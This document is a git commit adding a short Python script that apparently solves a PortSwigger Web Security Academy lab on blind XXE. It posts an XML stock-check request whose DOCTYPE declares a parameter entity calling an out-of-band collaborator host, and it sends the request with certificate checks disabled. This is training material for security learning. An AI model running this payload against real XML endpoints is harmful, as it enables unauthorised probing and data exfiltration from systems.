464353b9f006a6e49f8b8b8ccfff9a20c6f9c36a
Grzegorz Sowa <grzegorz.sowa@allegropay.pl>
2024-08-09 18:05:02 +0200

    XXE injection

---
+++ Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities.py
@@ -0,0 +1,34 @@
+import http.client
+import ssl
+
+LAB_ID = "???"
+COLLABORATOR_URL = "???"
+
+
+def POST_product_stock() -> http.client.HTTPResponse:
+    method, path = 'POST', '/product/stock'
+    host, port = f'{LAB_ID}.web-security-academy.net', 443
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.5',
+        'content-type': 'application/xml',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'priority': 'u=0',
+        'te': 'trailers',
+    }
+    body = '<?xml version="1.0" encoding="UTF-8"?>' + \
+           f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{COLLABORATOR_URL}"> %xxe; ]>' + \
+           '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+    headers['Content-Length'] = str(len(body))
+    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
+    connection.request(method, path, body, headers)
+    return connection.getresponse()
+
+
+response = POST_product_stock()
+print(response.status)
+for name, header in response.headers.items():
+    print(f"{name}: {header}")
+print(response.read().decode())
